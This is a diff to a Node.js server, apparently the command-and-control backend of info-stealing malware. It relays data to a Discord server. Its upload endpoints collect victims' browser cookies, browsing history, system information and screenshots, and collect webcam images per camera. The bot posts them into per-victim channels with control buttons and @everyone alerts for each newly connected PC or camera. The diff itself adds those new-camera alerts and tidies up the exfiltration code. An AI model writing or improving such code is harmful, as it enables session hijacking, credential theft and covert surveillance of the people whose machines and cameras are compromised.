@@ -29,11 +29,11 @@ const CATEGORY_BASE_PC = " | Все ПК | ";
 const CATEGORY_BASE_CAM = " | Камеры | ";
 const CATEGORY_ARCHIVE_CAM = " | Архив камер | ";
 const LOG_CATEGORY = " | Логи | ";
-const LOG_CHANNEL = " / Серверные логи /";
+const LOG_CHANNEL = " / Серверные логи / ";
 
 const ONLINE_TIMEOUT = 1 * 60 * 1000;
 const MAX_FILE_SIZE = 6 * 1024 * 1024;
-const CAM_INACTIVE_THRESHOLD = 1 * 60 * 1000; // 2 минуты
+const CAM_INACTIVE_THRESHOLD = 1 * 60 * 1000; // 1 минута
 
 // ---------- Состояние ----------
 const onlinePCs = {};
@@ -167,57 +167,36 @@ app.post("/upload-pc", async (req, res) => {
             isNewPc = true;
         }
 
-        // ---------- Оповещение о новом ПК ----------
         if (isNewPc) {
             const logChannel = await getOrCreateLogChannel(guild);
             await logChannel.send(`🚀 Новый ПК подключен: **${pcId}** <@everyone>`);
         }
 
-        // ---------- Формируем файлы и подписи ----------
         const files = [];
         const descriptions = [];
 
         if (cookies) {
-            files.push({
-                attachment: Buffer.from(JSON.stringify({ cookies }, null, 2)),
-                name: `${channelName}-cookies.json`
-            });
+            files.push({ attachment: Buffer.from(JSON.stringify({ cookies }, null, 2)), name: `${channelName}-cookies.json` });
             descriptions.push("🍪 **Cookies** — сохранены");
         }
-
         if (history) {
-            files.push({
-                attachment: Buffer.from(JSON.stringify({ history }, null, 2)),
-                name: `${channelName}-history.json`
-            });
+            files.push({ attachment: Buffer.from(JSON.stringify({ history }, null, 2)), name: `${channelName}-history.json` });
             descriptions.push("📜 **История браузера** — сохранена");
         }
-
         if (systemInfo) {
-            files.push({
-                attachment: Buffer.from(JSON.stringify({ systemInfo }, null, 2)),
-                name: `${channelName}-system.json`
-            });
+            files.push({ attachment: Buffer.from(JSON.stringify({ systemInfo }, null, 2)), name: `${channelName}-system.json` });
             descriptions.push("💻 **Системная информация** — сохранена");
         }
-
         if (screenshot) {
-            files.push({
-                attachment: Buffer.from(screenshot, "base64"),
-                name: `${channelName}-screenshot.jpeg`
-            });
+            files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${channelName}-screenshot.jpeg` });
             descriptions.push("🖼️ **Скриншот** — сохранён");
         }
 
         let contentMsg = `🟢 ПК **${pcId}** обновлён\n\n` + descriptions.join("\n");
-        const messageOptions = {
-            content: contentMsg,
-            components: createControlButtons(pcId)
-        };
+        const messageOptions = { content: contentMsg, components: createControlButtons(pcId) };
         if (files.length) messageOptions.files = files;
 
         await finalChannel.send(messageOptions);
-
         res.json({ success: true });
     } catch (e) { 
         await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`); 
@@ -249,22 +228,30 @@ app.post("/upload-cam", async (req, res) => {
             });
         }
 
-        camLastUpload[camId] = Date.now();
-
         const guild = await bot.guilds.fetch(GUILD_ID);
-        const isInactive = Date.now() - camLastUpload[camId] > CAM_INACTIVE_THRESHOLD;
+        const isInactive = Date.now() - (camLastUpload[camId] || 0) > CAM_INACTIVE_THRESHOLD;
         const categoryName = isInactive ? CATEGORY_ARCHIVE_CAM : CATEGORY_BASE_CAM;
         const category = await getOrCreateCategory(guild, categoryName);
 
         const channelName = safeChannelName('cam', camId);
         let finalChannel = null;
+        let isNewCam = false;
+
         if (channelByCam[camId]) {
             finalChannel = await guild.channels.fetch(channelByCam[camId]).catch(() => null);
         }
         if (!finalChannel || finalChannel.parentId !== category.id) {
             finalChannel = await getOrCreateTextChannel(guild, channelName, category.id);
             channelByCam[camId] = finalChannel.id;
+            isNewCam = true;
         }
+
+        if (isNewCam) {
+            const logChannel = await getOrCreateLogChannel(guild);
+            await logChannel.send(`🚀 Новая камера подключена: **${camId}** <@everyone>`);
+        }
+
+        camLastUpload[camId] = Date.now();
 
         const buffer = Buffer.from(screenshot, "base64");
         if (buffer.length <= MAX_FILE_SIZE) {
